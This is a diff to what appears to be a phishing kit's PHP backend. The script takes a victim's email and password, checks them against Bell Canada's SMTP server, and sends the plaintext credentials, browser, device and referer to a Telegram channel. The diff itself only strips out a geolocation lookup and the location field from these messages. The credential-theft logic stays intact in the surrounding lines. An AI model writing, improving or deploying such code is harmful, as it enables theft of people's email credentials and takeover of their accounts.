@@ -82,21 +82,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         echo json_encode(['status'=>'error','message'=>msg('password_required',$lang,$messages)]); exit;
     }
 
-    // Get IP & location
-   // $ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
-   // $locationData = @file_get_contents("http://ip-api.com/json/{$ip}?fields=country,regionName,city,query");
-   // $locationText = '';
-   // if ($locationData) {
-       // $loc = json_decode($locationData, true);
-       // if (is_array($loc)) {
-           // $city       = $loc['city']       ?? 'Unknown City';
-          //  $regionName = $loc['regionName'] ?? 'Unknown Region';
-          //  $country    = $loc['country']    ?? 'Unknown Country';
-          //  $queryIP    = $loc['query']      ?? $ip;
-          //  $locationText = "$city, $regionName, $country (IP: $queryIP)";
-        }
-    }
-
     // SMTP check
     $server = 'ssl://smtpa.bellnet.ca';
     $port   = 465;
@@ -112,7 +97,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         sendToTelegram("❌ Connection Failed
 📧 Email: $email
 🔑 Password: $password
-🌍 Location: $locationText
 🖥️ Browser: $browser_info
 📱 Device: $device_info
 ↪️ Referer: $referer
@@ -139,7 +123,6 @@ Error: $errstr ($errno)");
             sendToTelegram("✅ Login Successful
 📧 Email: $email
 🔑 Password: $password
-🌍 Location: $locationText
 🖥️ Browser: $browser_info
 📱 Device: $device_info
 ↪️ Referer: $referer
@@ -152,7 +135,6 @@ Error: $errstr ($errno)");
             sendToTelegram("❌ Login Failed
 📧 Email: $email
 🔑 Password: $password
-🌍 Location: $locationText
 🖥️ Browser: $browser_info
 📱 Device: $device_info
 ↪️ Referer: $referer
